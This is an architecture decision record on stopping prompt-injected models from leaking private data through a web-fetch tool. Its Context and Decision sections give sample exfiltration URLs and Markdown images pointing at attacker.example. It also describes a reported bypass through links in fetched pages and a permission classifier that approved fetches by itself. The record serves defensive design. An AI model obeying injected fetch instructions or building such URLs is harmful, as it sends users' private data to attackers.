# 0007: Apps limit which URLs may be fetched; harnesses ask before each fetch

- **Status:** accepted. The recommended option, taken when the user said to go ahead on 2026-11-05; not picked
  explicitly, and easy to change before M5. The rule for harnesses isn't in use, since none are connected
  ([ADR 0010](0010-home-apps-only-for-now.md)). It applies if one is reconnected.
- **Date:** 2026-11-05

## Context

A page can tell a model to fetch `https://attacker.example/?data=<private notes>`. That's a public address, so the
rules in [0006](0006-web-fetch-cannot-reach-home-network.md) allow it, and the private data leaves in the URL.

Anthropic warns that its own fetch tool "poses data exfiltration risks" where a model handles untrusted input alongside
sensitive data. Its API refuses URLs that appear only in the model's own output. A July 2026 report describes a bypass
through links inside fetched pages, and says Anthropic closed it by no longer following them, though its current docs
still list fetch results as an allowed source.

None of that protects a self-hosted tool. mcpgw is stateless and can't tell where a URL came from. Only whoever holds
the conversation can.

## Decision

**Apps** enforce a URL source rule. homestorm allows `web_fetch` only on URLs in the chair's messages or the brief, or
returned by `web_search` in that meeting. Links inside fetched pages and URLs the model made up are refused, and the
refusal goes back to the model as a tool error. This is the strict side of Anthropic's rule, chosen because of the
report above.

**Apps that render a model's Markdown don't load images.** A model could write `![](https://attacker.example/?data=…)`, and
the browser would send that with no click at all, getting around the URL rule. homestorm had this, and fixed it at M5.

**Harnesses** let `web_search` run freely, and `web_fetch` ask each time, because those sessions can see code and
secrets:

- Claude Code: allow `mcp__mcpgw__web_search`, and put `mcp__mcpgw__web_fetch` under `ask`. An `ask` rule is needed, not
  just leaving it off the allow list: in `auto` mode the classifier approved `web_fetch` by itself.
- Codex: `tools.web_fetch.approval_mode = "prompt"`.

**mcpgw** does what it can without knowing the conversation: a 250-character URL limit, no credentials in URLs, `GET`
only, no cookies, cleaned output, a line marking fetched text as data rather than instructions, and no full fetch URLs
in logs. These reduce the risk and don't remove it.

Both tools keep `readOnlyHint: true`, since it's accurate: they change nothing on the caller's side. The hint describes
state, not leaks, and it's why Codex needs the setting above.

## Alternatives considered

- **mcpgw remembers URLs from search results and allows only those.** Rejected: it adds shared state, and can't see URLs
  the user typed.
- **A domain allow-list.** Rejected: it defeats the point of reading any page a search finds.
- **Refusing query strings.** Rejected: too many real pages need them.
- **Trusting that the chair will see the links** (homestorm shows them under each answer). Kept as well, but on its own
  it only reveals a leak after it has happened.
- **Letting `web_fetch` run freely in harnesses.** More convenient. Rejected as the default, and easy for the user to
  turn on per machine.

## Consequences

- A seat can't follow a link from a page it read unless the chair posts it. That costs some research depth, and can be
  loosened per meeting later.
- Every new app must implement the rule. The design says so, and mcpgw can't check it.
- **Search queries can leak too,** but they go to search engines rather than an address an attacker reads, so
  `web_search` runs freely.
- Unattended harness runs can't use `web_fetch`. Tested: `codex exec` refuses it, an interactive Codex session asks first,
  and `claude -p` with the `ask` rule denies it.
- **Harness models prefer their own search anyway,** so the harness rule mostly matters when mcpgw is named.
